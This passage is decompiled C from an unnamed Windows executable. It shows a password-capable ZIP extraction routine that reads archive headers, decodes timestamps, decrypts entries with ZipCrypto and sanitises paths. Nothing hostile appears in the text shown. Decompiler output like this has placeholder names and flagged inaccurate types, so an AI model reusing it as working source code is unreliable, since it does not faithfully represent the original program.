  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&uStack_94), iVar2 == 0)) {
    aiStack_84[2] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[2] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  if (((uint)(iStack_64 + iStack_60) <= (uint)(*(int *)(in_EAX + 0xc) + local_88)) &&
     (local_90 == 0)) {
    aiStack_84[3] = ((*(int *)(in_EAX + 0xc) - iStack_64) - iStack_60) + local_88;
    iStack_68 = local_88;
    uStack_8 = 0;
    *(undefined4 *)(in_EAX + 0xc) = 0;
    piVar4 = (int *)_malloc(0x80);
    piVar7 = aiStack_84;
    piVar8 = piVar4;
    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {
      *piVar8 = *piVar7;
      piVar7 = piVar7 + 1;
      piVar8 = piVar8 + 1;
    }
    FUN_004091d0();
    return piVar4;
  }
  if (in_EAX[0x10] != '\0') {
    CloseHandle(*(HANDLE *)(in_EAX + 4));
  }
  _free(in_EAX);
  return (int *)0x0;
}



int __cdecl FUN_00408d80(int *param_1,uint *param_2,void *param_3,uint param_4)

{
  char *pcVar1;
  char **in_EAX;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int local_5c;
  uint local_58;
  int aiStack_54 [4];
  uint uStack_44;
  uint uStack_34;
  int iStack_30;
  int iStack_2c;
  int iStack_28;
  int iStack_24;
  int iStack_1c;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  int iStack_8;
  
  local_5c = 0;
  if (in_EAX == (char **)0x0) {
    return -0x66;
  }
  pcVar1 = *in_EAX;
  if (*pcVar1 == '\0') {
    *(char **)(pcVar1 + 0x1c) = in_EAX[5] + (int)in_EAX[3];
  }
  else {
    if (pcVar1[1] == '\0') {
      local_5c = -1;
      goto LAB_00408e01;
    }
    SetFilePointer(*(HANDLE *)(pcVar1 + 4),
                   (LONG)(in_EAX[5] + (int)in_EAX[3] + *(int *)(pcVar1 + 0xc)),(PLONG)0x0,0);
  }
  iVar2 = FUN_004088a0();
  if (iVar2 == 0) {
    if (local_58 != 0x2014b50) {
      local_5c = -0x67;
    }
  }
  else {
    local_5c = -1;
  }
LAB_00408e01:
  iVar2 = FUN_00408810(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    aiStack_54[0] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[0] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408810(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    aiStack_54[1] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[1] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408810(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    aiStack_54[2] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[2] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408810(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    aiStack_54[3] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[3] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  uStack_10 = uStack_44 >> 0x10 & 0x1f;
  iStack_8 = (uStack_44 >> 0x19) + 0x7bc;
  iStack_c = (uStack_44 >> 0x15 & 0xf) - 1;
  uStack_14 = uStack_44 >> 0xb & 0x1f;
  uStack_18 = uStack_44 >> 5 & 0x3f;
  iStack_1c = (uStack_44 & 0x1f) * 2;
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00408810(&local_58);
  uStack_34 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    uStack_34 = local_58 * 0x100 + uStack_34;
  }
  else {
    uStack_34 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408810(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    iStack_30 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_30 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408810(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    iStack_2c = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_2c = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408810(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    iStack_28 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_28 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00408810(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00408810(&local_58), iVar2 == 0)) {
    iStack_24 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_24 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004088a0();
  if (iVar2 != 0) {
    return -1;
  }
  if (local_5c == 0) {
    if (param_3 != (void *)0x0) {
      if (uStack_34 < param_4) {
        *(undefined *)(uStack_34 + (int)param_3) = 0;
      }
      if (((uStack_34 != 0) && (param_4 != 0)) &&
         (uVar3 = FUN_004087b0(param_4,param_3,1), uVar3 != 1)) {
        return -1;
      }
    }
    if (param_1 != (int *)0x0) {
      piVar4 = aiStack_54;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_1 = *piVar4;
        piVar4 = piVar4 + 1;
        param_1 = param_1 + 1;
      }
    }
    if (param_2 != (uint *)0x0) {
      *param_2 = local_58;
    }
  }
  return local_5c;
}



int FUN_004091d0(void)

{
  int iVar1;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return -0x66;
  }
  *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x24);
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  iVar1 = FUN_00408d80((int *)(unaff_ESI + 0x28),(uint *)(unaff_ESI + 0x78),(void *)0x0,0);
  *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
  return iVar1;
}



int __cdecl FUN_00409210(char **param_1,char **param_2,char **param_3)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  char **unaff_EDI;
  char *pcStack_8;
  char *local_4;
  
  iVar6 = 0;
  *param_1 = (char *)0x0;
  pcVar5 = unaff_EDI[3];
  pcVar2 = unaff_EDI[0x1e];
  *param_2 = (char *)0x0;
  pcVar3 = *unaff_EDI;
  cVar1 = *pcVar3;
  *param_3 = (char *)0x0;
  if (cVar1 == '\0') {
    *(char **)(pcVar3 + 0x1c) = pcVar5 + (int)pcVar2;
  }
  else {
    if (pcVar3[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(pcVar3 + 4),(LONG)(pcVar5 + (int)pcVar2 + *(int *)(pcVar3 + 0xc)),
                   (PLONG)0x0,0);
  }
  iVar4 = FUN_004088a0();
  if (iVar4 == 0) {
    if (local_4 != (char *)0x4034b50) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00408810((uint *)&local_4);
  if (iVar4 == 0) {
    iVar4 = FUN_00408810((uint *)&local_4);
    if (iVar4 != 0) goto LAB_004092a3;
  }
  else {
LAB_004092a3:
    iVar6 = -1;
  }
  iVar4 = FUN_00408810((uint *)&local_4);
  pcVar5 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00408810((uint *)&local_4);
    if (iVar4 != 0) goto LAB_004092dd;
    local_4 = pcVar5 + (int)local_4 * 0x100;
  }
  else {
LAB_004092dd:
    local_4 = (char *)0x0;
    if (iVar4 != 0) {
      iVar6 = -1;
    }
  }
  iVar4 = FUN_00408810((uint *)&pcStack_8);
  pcVar5 = pcStack_8;
  if (iVar4 == 0) {
    iVar4 = FUN_00408810((uint *)&pcStack_8);
    if (iVar4 != 0) goto LAB_00409360;
    pcStack_8 = pcVar5 + (int)pcStack_8 * 0x100;
LAB_00409321:
    if ((iVar6 == 0) &&
       ((pcVar5 = unaff_EDI[0xd], pcStack_8 != pcVar5 ||
        ((pcVar5 != (char *)0x0 && (pcVar5 != (char *)0x8)))))) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_00409360:
    pcStack_8 = (char *)0x0;
    if (iVar4 == 0) goto LAB_00409321;
    iVar6 = -1;
  }
  iVar4 = FUN_004088a0();
  if (iVar4 != 0) {
    iVar6 = -1;
  }
  iVar4 = FUN_004088a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0xf])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_004088a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x10])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_004088a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x11])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00408810((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00408810((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00409466;
    pcVar5 = pcStack_8 + (int)local_4 * 0x100;
LAB_00409419:
    if ((iVar6 == 0) && (pcVar5 != unaff_EDI[0x12])) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_00409466:
    pcVar5 = (char *)0x0;
    if (iVar4 == 0) goto LAB_00409419;
    iVar6 = -1;
  }
  *param_1 = *param_1 + (int)pcVar5;
  iVar4 = FUN_00408810((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00408810((uint *)&local_4);
    if (iVar4 == 0) {
      pcStack_8 = pcStack_8 + (int)local_4 * 0x100;
      goto LAB_0040947a;
    }
  }
  pcStack_8 = (char *)0x0;
  if (iVar4 != 0) {
    iVar6 = -1;
  }
LAB_0040947a:
  *param_2 = unaff_EDI[0x1e] + 0x1e + (int)pcVar5;
  *param_3 = pcStack_8;
  *param_1 = *param_1 + (int)pcStack_8;
  return iVar6;
}



undefined4 __cdecl FUN_004094a0(char *param_1)

{
  void **in_EAX;
  int iVar1;
  void **_Memory;
  void *pvVar2;
  void *extraout_ECX;
  void **ppvVar3;
  void **extraout_EDX;
  char *local_c;
  char *local_8;
  char *local_4;
  
  if ((in_EAX == (void **)0x0) || (in_EAX[6] == (void *)0x0)) {
    return 0xffffff9a;
  }
  if (in_EAX[0x1f] != (void *)0x0) {
    FUN_00409890();
  }
  iVar1 = FUN_00409210(&local_4,&local_c,&local_8);
  if (iVar1 != 0) {
    return 0xffffff99;
  }
  _Memory = (void **)_malloc(0x84);
  if (_Memory != (void **)0x0) {
    pvVar2 = _malloc(0x4000);
    *_Memory = pvVar2;
    _Memory[0x11] = local_c;
    _Memory[0x12] = local_8;
    _Memory[0x13] = (void *)0x0;
    if (pvVar2 != (void *)0x0) {
      _Memory[0x10] = (void *)0x0;
      pvVar2 = in_EAX[0xd];
      _Memory[0x15] = in_EAX[0xf];
      _Memory[0x14] = (void *)0x0;
      _Memory[0x19] = in_EAX[0xd];
      _Memory[0x18] = *in_EAX;
      _Memory[0x1a] = in_EAX[3];
      _Memory[6] = (void *)0x0;
      if (pvVar2 != (void *)0x0) {
        _Memory[9] = (void *)0x0;
        _Memory[10] = (void *)0x0;
        _Memory[0xb] = (void *)0x0;
        iVar1 = FUN_00408350();
        if (iVar1 == 0) {
          _Memory[0x10] = (void *)0x1;
        }
      }
      _Memory[0x16] = in_EAX[0x10];
      pvVar2 = in_EAX[0x11];
      _Memory[0x17] = pvVar2;
      *(byte *)(_Memory + 0x1b) = *(byte *)(in_EAX + 0xc) & 1;
      if (((uint)in_EAX[0xc] >> 3 & 1) == 0) {
        *(undefined *)(_Memory + 0x20) = *(undefined *)((int)in_EAX + 0x3f);
      }
      else {
        pvVar2 = (void *)CONCAT31((int3)((uint)pvVar2 >> 8),*(undefined *)((int)in_EAX + 0x39));
        *(undefined *)(_Memory + 0x20) = *(undefined *)((int)in_EAX + 0x39);
      }
      ppvVar3 = _Memory + 0x1c;
      *ppvVar3 = (void *)0x12345678;
      _Memory[0x1d] = (void *)0x23456789;
      _Memory[0x1e] = (void *)0x34567890;
      _Memory[0x1f] = (void *)(-(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc);
      if (param_1 != (char *)0x0) {
        do {
          if (*param_1 == '\0') break;
          FUN_00408040(CONCAT31((int3)((uint)pvVar2 >> 8),*param_1),(uint *)ppvVar3);
          param_1 = param_1 + 1;
          pvVar2 = extraout_ECX;
          ppvVar3 = extraout_EDX;
        } while (param_1 != (char *)0x0);
      }
      _Memory[0xf] = local_4 + (int)in_EAX[0x1e] + 0x1e;
      _Memory[2] = (void *)0x0;
      in_EAX[0x1f] = _Memory;
      return 0;
    }
    _free(_Memory);
  }
  return 0xffffff98;
}



int __thiscall FUN_00409620(void *this,void *param_1,undefined *param_2)

{
  void **ppvVar1;
  char cVar2;
  void **ppvVar3;
  char *pcVar4;
  byte *pbVar5;
  undefined uVar6;
  int in_EAX;
  uint uVar7;
  void *pvVar8;
  int iVar9;
  int extraout_ECX;
  void *pvVar10;
  void *pvVar11;
  int local_c;
  int local_8;
  
  local_8 = 0;
  local_c = 0;
  if (param_2 != (undefined *)0x0) {
    *param_2 = 0;
  }
  if ((in_EAX == 0) || (ppvVar3 = *(void ***)(in_EAX + 0x7c), ppvVar3 == (void **)0x0)) {
    return -0x66;
  }
  if (*ppvVar3 == (void *)0x0) {
    return -100;
  }
  if (this != (void *)0x0) {
    ppvVar3[4] = param_1;
    ppvVar3[5] = this;
    if (ppvVar3[0x17] < this) {
      ppvVar3[5] = ppvVar3[0x17];
    }
    if (ppvVar3[5] != (void *)0x0) {
      do {
        if ((ppvVar3[2] == (void *)0x0) && (pvVar11 = ppvVar3[0x16], pvVar11 != (void *)0x0)) {
          pvVar8 = (void *)0x4000;
          if ((pvVar11 < (void *)0x4000) && (pvVar8 = pvVar11, pvVar11 == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return 0;
            }
            *param_2 = 1;
            return 0;
          }
          pcVar4 = (char *)ppvVar3[0x18];
          iVar9 = (int)ppvVar3[0x1a] + (int)ppvVar3[0xf];
          if (*pcVar4 == '\0') {
            *(int *)(pcVar4 + 0x1c) = iVar9;
          }
          else {
            if (pcVar4[1] == '\0') {
              return -1;
            }
            SetFilePointer(*(HANDLE *)(pcVar4 + 4),*(int *)(pcVar4 + 0xc) + iVar9,(PLONG)0x0,0);
            iVar9 = extraout_ECX;
          }
          uVar7 = FUN_004087b0(iVar9,*ppvVar3,1);
          if (uVar7 != 1) {
            return -1;
          }
          pvVar11 = *ppvVar3;
          ppvVar3[0xf] = (void *)((int)ppvVar3[0xf] + (int)pvVar8);
          ppvVar3[0x16] = (void *)((int)ppvVar3[0x16] - (int)pvVar8);
          ppvVar3[1] = pvVar11;
          ppvVar3[2] = pvVar8;
          if ((*(char *)(ppvVar3 + 0x1b) != '\0') && (pvVar10 = (void *)0x0, pvVar8 != (void *)0x0))
          {
            do {
              uVar6 = FUN_00408090();
              *(undefined *)((int)pvVar10 + (int)pvVar11) = uVar6;
              pvVar10 = (void *)((int)pvVar10 + 1);
            } while (pvVar10 < pvVar8);
          }
        }
        pvVar11 = ppvVar3[2];
        pvVar8 = ppvVar3[0x1f];
        if (pvVar11 < ppvVar3[0x1f]) {
          pvVar8 = pvVar11;
        }
        if (pvVar8 != (void *)0x0) {
          cVar2 = *(char *)((int)(void *)((int)ppvVar3[1] + (int)pvVar8) + -1);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar8);
          ppvVar1 = ppvVar3 + 0x1f;
          *ppvVar1 = (void *)((int)*ppvVar1 - (int)pvVar8);
          ppvVar3[2] = (void *)((int)pvVar11 - (int)pvVar8);
          ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar8);
          if ((*ppvVar1 == (void *)0x0) && (cVar2 != *(char *)(ppvVar3 + 0x20))) {
            return -0x6a;
          }
        }
        if (ppvVar3[0x19] == (void *)0x0) {
          pvVar11 = ppvVar3[2];
          if (ppvVar3[5] < ppvVar3[2]) {
            pvVar11 = ppvVar3[5];
          }
          pvVar8 = (void *)0x0;
          if (pvVar11 != (void *)0x0) {
            do {
              *(undefined *)((int)pvVar8 + (int)ppvVar3[4]) =
                   *(undefined *)((int)pvVar8 + (int)ppvVar3[1]);
              pvVar8 = (void *)((int)pvVar8 + 1);
            } while (pvVar8 < pvVar11);
          }
          pbVar5 = (byte *)ppvVar3[4];
          pvVar8 = (void *)FUN_00407f10(pbVar5,(uint)ppvVar3[0x14]);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar11);
          ppvVar3[2] = (void *)((int)ppvVar3[2] - (int)pvVar11);
          ppvVar3[5] = (void *)((int)ppvVar3[5] - (int)pvVar11);
          ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar11);
          ppvVar3[6] = (void *)((int)ppvVar3[6] + (int)pvVar11);
          local_c = local_c + (int)pvVar11;
          ppvVar3[0x14] = pvVar8;
          ppvVar3[4] = pbVar5 + (int)pvVar11;
          if ((ppvVar3[0x17] == (void *)0x0) && (param_2 != (undefined *)0x0)) {
            *param_2 = 1;
          }
        }
        else {
          pbVar5 = (byte *)ppvVar3[4];
          pvVar11 = ppvVar3[6];
          local_8 = FUN_00408400();
          pvVar8 = ppvVar3[6];
          pvVar10 = (void *)FUN_00407f10(pbVar5,(uint)ppvVar3[0x14]);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - ((int)pvVar8 - (int)pvVar11));
          local_c = local_c + ((int)pvVar8 - (int)pvVar11);
          ppvVar3[0x14] = pvVar10;
          if ((local_8 == 1) || (ppvVar3[0x17] == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return local_c;
            }
            *param_2 = 1;
            return local_c;
          }
          if (local_8 != 0) {
            return local_8;
          }
        }
      } while (ppvVar3[5] != (void *)0x0);
      if (local_8 != 0) {
        return local_8;
      }
    }
    return local_c;
  }
  return 0;
}



undefined4 FUN_00409890(void)

{
  void **_Memory;
  undefined4 uVar1;
  int unaff_EDI;
  
  uVar1 = 0;
  if (unaff_EDI == 0) {
    return 0xffffff9a;
  }
  _Memory = *(void ***)(unaff_EDI + 0x7c);
  if (_Memory == (void **)0x0) {
    return 0xffffff9a;
  }
  if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
    uVar1 = 0xffffff97;
  }
  if (*_Memory != (void *)0x0) {
    _free(*_Memory);
    *_Memory = (void *)0x0;
  }
  *_Memory = (void *)0x0;
  if (_Memory[0x10] != (void *)0x0) {
    FUN_00408300();
  }
  _Memory[0x10] = (void *)0x0;
  _free(_Memory);
  *(undefined4 *)(unaff_EDI + 0x7c) = 0;
  return uVar1;
}



_FILETIME __fastcall FUN_00409910(uint param_1)

{
  uint in_EAX;
  _FILETIME local_1c;
  SYSTEMTIME local_14;
  
  local_14.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_14.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_14.wDay = (ushort)param_1 & 0x1f;
  local_14.wSecond = ((ushort)in_EAX & 0x1f) * 2;
  local_14.wHour = (ushort)in_EAX >> 0xb;
  local_14.wMinute = (ushort)(in_EAX >> 5) & 0x3f;
  local_14.wMilliseconds = 0;
  SystemTimeToFileTime(&local_14,&local_1c);
  return local_1c;
}



void FUN_00409980(void)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 *unaff_ESI;
  
  unaff_ESI[1] = 0xffffffff;
  unaff_ESI[0x8e] = 0xffffffff;
  *unaff_ESI = 0;
  unaff_ESI[0x8f] = 0;
  unaff_ESI[0x90] = 0;
  pcVar2 = &DAT_0041dd5c;
  do {
    pcVar3 = pcVar2;
    pcVar2 = pcVar3 + 1;
  } while (*pcVar3 != '\0');
  pcVar2 = (char *)operator_new((uint)(pcVar3 + -0x41dd5b));
  unaff_ESI[0x8f] = pcVar2;
  pcVar3 = &DAT_0041dd5c;
  do {
    cVar1 = *pcVar3;
    *pcVar2 = cVar1;
    pcVar3 = pcVar3 + 1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  return;
}



int FUN_004099f0(undefined4 param_1,undefined4 param_2)

{
  short *psVar1;
  WCHAR WVar2;
  short sVar3;
  int **lpBuffer;
  undefined *puVar4;
  int *piVar5;
  int **unaff_ESI;
  undefined4 *puVar6;
  
  if ((*unaff_ESI == (int *)0x0) && (unaff_ESI[1] == (int *)0xffffffff)) {
    lpBuffer = unaff_ESI + 0x91;
    GetCurrentDirectoryW(0x104,(LPWSTR)lpBuffer);
    do {
      WVar2 = *(WCHAR *)lpBuffer;
      lpBuffer = (int **)((int)lpBuffer + 2);
    } while (WVar2 != L'\0');
    sVar3 = *(short *)((int)unaff_ESI + ((int)lpBuffer - ((int)unaff_ESI + 0x246) >> 1) * 2 + 0x242)
    ;
    if ((sVar3 != 0x5c) && (sVar3 != 0x2f)) {
      puVar6 = (undefined4 *)((int)unaff_ESI + 0x242);
      do {
        psVar1 = (short *)((int)puVar6 + 2);
        puVar6 = (undefined4 *)((int)puVar6 + 2);
      } while (*psVar1 != 0);
      *puVar6 = DAT_0041dc40;
    }
    puVar4 = (undefined *)operator_new(0x20);
    *puVar4 = 0;
    puVar4[1] = 1;
    puVar4[0x10] = 0;
    *(undefined4 *)(puVar4 + 0x14) = param_1;
    *(undefined4 *)(puVar4 + 0x18) = param_2;
    *(undefined4 *)(puVar4 + 0x1c) = 0;
    *(undefined4 *)(puVar4 + 0xc) = 0;
    piVar5 = FUN_00408af0();
    *unaff_ESI = piVar5;
    return (-(uint)(piVar5 != (int *)0x0) & 0xfffffe00) + 0x200;
  }
  return 0x1000000;
}



void __thiscall FUN_00409ab0(void *this,int param_1,int *param_2)

{
  wchar_t wVar1;
  int3 iVar2;
  _FILETIME _Var3;
  byte bVar4;
  int iVar5;
  char *pcVar6;
  wchar_t *pwVar7;
  wchar_t *_Str;
  uint uVar8;
  byte bVar9;
  int iVar10;
  undefined4 extraout_ECX;
  byte bVar11;
  byte bVar12;
  int *piVar13;
  undefined4 *puVar14;
  char *pcVar15;
  bool bVar16;
  longlong lVar17;
  undefined auStack_394 [2];
  byte bStack_392;
  byte bStack_391;
  char *local_390;
  undefined uStack_389;
  undefined4 local_388;
  int *local_384;
  char *local_380;
  _FILETIME _Stack_37c;
  _FILETIME _Stack_374;
  uint local_36c [4];
  uint uStack_35c;
  int iStack_354;
  int iStack_350;
  uint uStack_338;
  CHAR local_31c [264];
  WCHAR aWStack_214 [262];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)auStack_394;
  local_384 = (int *)this;
                    // WARNING: Load size is inaccurate
  if ((param_1 < -1) || (*(int *)(*this + 4) <= param_1)) goto LAB_0040a02d;
  if (*(int *)((int)this + 4) != -1) {
    FUN_00409890();
  }
  _Var3.dwHighDateTime = _Stack_374.dwHighDateTime;
  _Var3.dwLowDateTime = _Stack_374.dwLowDateTime;
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if (param_1 == *(int *)((int)this + 0x238)) {
    if (param_1 != -1) {
      piVar13 = (int *)((int)this + 8);
      for (iVar10 = 0x8c; iVar10 != 0; iVar10 = iVar10 + -1) {
        *param_2 = *piVar13;
        piVar13 = piVar13 + 1;
        param_2 = param_2 + 1;
      }
      goto LAB_0040a02d;
    }
  }
  else if (param_1 != -1) {
                    // WARNING: Load size is inaccurate
    if (param_1 < *(int *)(*this + 0x10)) {
      FUN_004091d0();
    }
                    // WARNING: Load size is inaccurate
    iVar10 = *(int *)(*this + 0x10);
    while (iVar10 < param_1) {
                    // WARNING: Load size is inaccurate
      iVar10 = *this;
      if (((iVar10 != 0) && (*(int *)(iVar10 + 0x18) != 0)) &&
         (iVar5 = *(int *)(iVar10 + 0x10) + 1, iVar5 != *(int *)(iVar10 + 4))) {
        *(int *)(iVar10 + 0x14) =
             *(int *)(iVar10 + 0x14) +
             *(int *)(iVar10 + 0x50) + *(int *)(iVar10 + 0x4c) + 0x2e + *(int *)(iVar10 + 0x48);
        *(int *)(iVar10 + 0x10) = iVar5;
        iVar5 = FUN_00408d80((int *)(iVar10 + 0x28),(uint *)(iVar10 + 0x78),(void *)0x0,0);
        *(uint *)(iVar10 + 0x18) = (uint)(iVar5 == 0);
      }
                    // WARNING: Load size is inaccurate
      iVar10 = *(int *)(*this + 0x10);
    }
    FUN_00408d80((int *)local_36c,(uint *)0x0,local_31c,0x104);
    iVar10 = FUN_00409210((char **)&local_388,&local_390,&local_380);
    if (iVar10 != 0) goto LAB_0040a02d;
                    // WARNING: Load size is inaccurate
    pcVar15 = **this;
    if (*pcVar15 == '\0') {
      *(char **)(pcVar15 + 0x1c) = local_390;
LAB_00409c58:
      pcVar15 = local_380;
      local_390 = (char *)operator_new((uint)local_380);
      pcVar6 = (char *)FUN_004087b0(extraout_ECX,local_390,(uint)pcVar15);
      if (pcVar6 == pcVar15) {
        *param_2 = *(int *)(*local_384 + 0x10);
        MultiByteToWideChar(0xfde9,0,local_31c,-1,aWStack_214,0x104);
        _Str = aWStack_214;
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    for (; (wVar1 = *_Str, wVar1 != L'\0' && (_Str[1] == L':')); _Str = _Str + 2) {
                    }
                    if (wVar1 != L'\\') break;
                    _Str = _Str + 1;
                  }
                  if (wVar1 != L'/') break;
                  _Str = _Str + 1;
                }
                pwVar7 = _wcsstr(_Str,u______0041ff5c);
                if (pwVar7 == (wchar_t *)0x0) break;
                _Str = pwVar7 + 4;
              }
              pwVar7 = _wcsstr(_Str,u______0041ff68);
              if (pwVar7 == (wchar_t *)0x0) break;
              _Str = pwVar7 + 4;
            }
            pwVar7 = _wcsstr(_Str,u______0041ff74);
            if (pwVar7 == (wchar_t *)0x0) break;
            _Str = pwVar7 + 4;
          }
          pwVar7 = _wcsstr(_Str,u______0041ff80);
          if (pwVar7 == (wchar_t *)0x0) break;
          _Str = pwVar7 + 4;
        }
        iVar10 = 4 - (int)_Str;
        do {
          wVar1 = *_Str;
          *(wchar_t *)((int)param_2 + iVar10 + (int)_Str) = wVar1;
          _Str = _Str + 1;
        } while (wVar1 != L'\0');
        bVar11 = ~(byte)(uStack_338 >> 0x17);
        bVar9 = (byte)(uStack_338 >> 0x1e);
        local_36c[0] = local_36c[0] >> 8;
        uStack_389 = 0;
        bStack_392 = 0;
        bStack_391 = 1;
        if (((local_36c[0] == 0) || (local_36c[0] == 7)) ||
           ((local_36c[0] == 0xb || (local_36c[0] == 0xe)))) {
          bStack_392 = (byte)(uStack_338 >> 2) & 1;
          bVar11 = (byte)uStack_338;
          bVar12 = (byte)(uStack_338 >> 1) & 1;
          bVar9 = (byte)(uStack_338 >> 4);
          bVar4 = (byte)(uStack_338 >> 5) & 1;
        }
        else {
          bVar12 = 0;
          bVar4 = 1;
        }
        param_2[0x83] = 0;
        if ((bVar9 & 1) != 0) {
          param_2[0x83] = 0x10;
        }
        if (bVar4 != 0) {
          param_2[0x83] = param_2[0x83] | 0x20;
        }
        if (bVar12 != 0) {
          param_2[0x83] = param_2[0x83] | 2;
        }
        if ((bVar11 & 1) != 0) {
          param_2[0x83] = param_2[0x83] | 1;
        }
        if (bStack_392 != 0) {
          param_2[0x83] = param_2[0x83] | 4;
        }
        param_2[0x8b] = iStack_350;
        param_2[0x8a] = iStack_354;
        _Stack_374 = FUN_00409910(uStack_35c >> 0x10);
        LocalFileTimeToFileTime(&_Stack_374,&_Stack_37c);
        pcVar6 = local_390;
        iVar10 = 0;
        param_2[0x84] = _Stack_37c.dwLowDateTime;
        param_2[0x85] = _Stack_37c.dwHighDateTime;
        param_2[0x86] = _Stack_37c.dwLowDateTime;
        param_2[0x87] = _Stack_37c.dwHighDateTime;
        param_2[0x88] = _Stack_37c.dwLowDateTime;
        param_2[0x89] = _Stack_37c.dwHighDateTime;
        if ((char *)0x4 < pcVar15) {
          local_388._2_1_ = 0;
          do {
            local_388._0_1_ = local_390[iVar10];
            iVar5 = 3;
            bVar16 = true;
            local_388._1_1_ = local_390[iVar10 + 1];
            puVar14 = &local_388;
            pcVar15 = &DAT_0041ff8c;
            do {
              if (iVar5 == 0) break;
              iVar5 = iVar5 + -1;
              bVar16 = *(char *)puVar14 == *pcVar15;
              puVar14 = (undefined4 *)((int)puVar14 + 1);
